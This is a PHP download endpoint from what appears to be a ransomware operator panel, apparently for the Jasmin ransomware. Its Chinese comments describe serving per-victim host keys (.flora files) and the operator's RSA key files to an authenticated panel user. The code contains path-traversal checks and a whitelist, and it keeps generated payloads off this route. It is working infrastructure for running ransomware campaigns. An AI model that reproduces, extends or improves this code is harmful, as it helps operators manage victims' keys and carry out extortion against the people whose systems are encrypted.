<?php
/**
 * 文件下载 — 严格白名单，杜绝任意文件读取
 *
 * 放行范围仅两类:
 *   ① passwords/**            受害者每主机密钥 (.flora)
 *   ② payloads/ 下的密钥文件    精确文件名白名单（见 $KEY_FILES）
 *
 * 说明: 早期版本只放行 passwords/，导致「下载私钥」按钮
 *       (指向 payloads/jasmin_private.pem 直链) 被 .htaccess 403 拦截。
 *       现统一改由本接口鉴权下发，直链仍然保持 403。
 */
require_once __DIR__ . '/includes/auth.php';
require_auth();

$file = str_replace('\\', '/', (string)($_GET['file'] ?? ''));
if ($file === '') {
    http_response_code(400);
    echo 'No file specified.';
    exit;
}

$root = realpath(__DIR__);
if ($root === false) {
    http_response_code(500);
    echo 'Server misconfigured.';
    exit;
}

// realpath 会归一化 ../ 与多余斜杠；随后必须仍位于 $root 之下
$real = realpath($root . '/' . $file);
if ($real === false || strpos($real, $root . '/') !== 0 || !is_file($real)) {
    http_response_code(404);
    echo 'File not found.';
    exit;
}

$rel = substr($real, strlen($root) + 1);   // 例: payloads/jasmin_private.pem

// payloads/ 下只允许密钥文件；生成的载荷/脚本不得经此下载
$KEY_FILES = [
    'payloads/jasmin_private.pem.enc',
    'payloads/jasmin_private.pem',
    'payloads/jasmin_public.pem',
    'payloads/.key_secret',
];

$allowed = (strpos($rel, 'passwords/') === 0) || in_array($rel, $KEY_FILES, true);
if (!$allowed) {
    http_response_code(403);
    echo 'Access denied.';
    exit;
}

if (!is_readable($real)) {
    http_response_code(500);
    echo 'File not readable (permission denied).';
    exit;
}

// 隐藏文件给个可读的文件名
$filename = basename($real);
if ($filename === '.key_secret') {
    $filename = 'jasmin_key_secret.txt';
}

header('Cache-Control: no-store');
header('Content-Description: File Transfer');
header('Content-Disposition: attachment; filename="' . $filename . '"');
header('Content-Type: application/octet-stream');
header('Content-Length: ' . filesize($real));
header('X-Content-Type-Options: nosniff');
readfile($real);
exit;
